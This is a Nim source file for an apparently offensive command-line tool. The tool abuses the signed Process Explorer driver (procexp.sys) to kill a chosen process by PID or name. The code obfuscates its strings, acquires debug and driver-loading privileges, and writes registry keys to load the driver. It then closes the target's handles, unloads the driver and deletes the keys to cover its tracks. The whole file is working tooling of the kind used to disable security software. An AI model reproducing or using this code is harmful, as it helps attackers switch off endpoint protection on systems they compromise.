import winim, std/[strutils, parseopt, strformat]
import getproc, driver, privilege, power, handle_rewrite, obf

when defined deploy:
    import deploy_driver


const driver_file {.strdefine.} : string = obf("procexp.sys")
const driver_path {.strdefine.} : string = obf("\\SystemRoot\\System32\\drivers\\")
const driver_name* {.strdefine.} : string = obf("PROCEXP152")

when isMainModule:

    var 
        pid_string : string = "nil"
        target : string = "nil"
        pid : int
        unload : bool = false

    ### cli helper

    proc writeHelp() = echo obf("""

    -h, --help                  : show help
    -p:(pid), --pid:(pid)       : kill from pid
    -n:(name), --name:(name)    : kill from name (without .exe)
    """)

    for kind, key, val in getopt():
      case kind
      of cmdArgument:
        discard
      of cmdLongOption, cmdShortOption:
        case key
        of "help", "h": writeHelp()
        of "pid", "p" : pid_string = val
        of "name", "n" : target = val
        of "unload", "u" : unload = true
      of cmdEnd: assert(false)

    if (pid_string == "nil" and target != "nil") :
        pid_string = getprocs(target)
    elif (pid_string == "nil" and target == "nil") :
        echo obf("[-] please chose a process either from name or pid")
        quit()
    
    pid = parseInt(pid_string)

    if (unload == true) :
        unload_driver()
        quit()

    when defined deploy:
        deploy()

    ### acquiring privileges
    if(not ArrangeSePrivilege(SE_DEBUG_NAME,true)):
        echo obf("[-] failed to acquire debug privilege (not admin ?)")
        quit()
    echo "[+] debug privilege acquired"

    if(not ArrangeSePrivilege(SE_LOAD_DRIVER_NAME,true)):
        echo obf("[-] failed to acquire load driver privilege (not admin ?)")
        quit()
    echo obf("[+] load driver privilege acquired")

    ### unpack driver
    #TODO : test loading the driver from another folder
    #TODO : try packing the driver / downloading


    ### adding regkey for driver loading
    #echo driver_path
    exec_power(driver_path, driver_file)

    ### loading driver
    load_driver()

    ### connecting to driver and fetching targets handle
    var 
        driver_handle : HANDLE = connect_to_driver(driver_name)
        target_handle : HANDLE = get_target_handle(pid)

    ### using driver to kill targets handles
    handle_grinder(driver_handle, target_handle, pid)


    #TODO: obfuscate this string
    echo obf("[+] process ") & $pid & obf(" killed")


    ### unloading driver
    unload_driver()

    ### deleting regkeys
    cleanup_power()